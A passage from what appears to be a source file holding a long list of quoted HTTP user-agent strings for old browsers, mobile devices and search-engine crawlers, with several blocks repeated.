               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
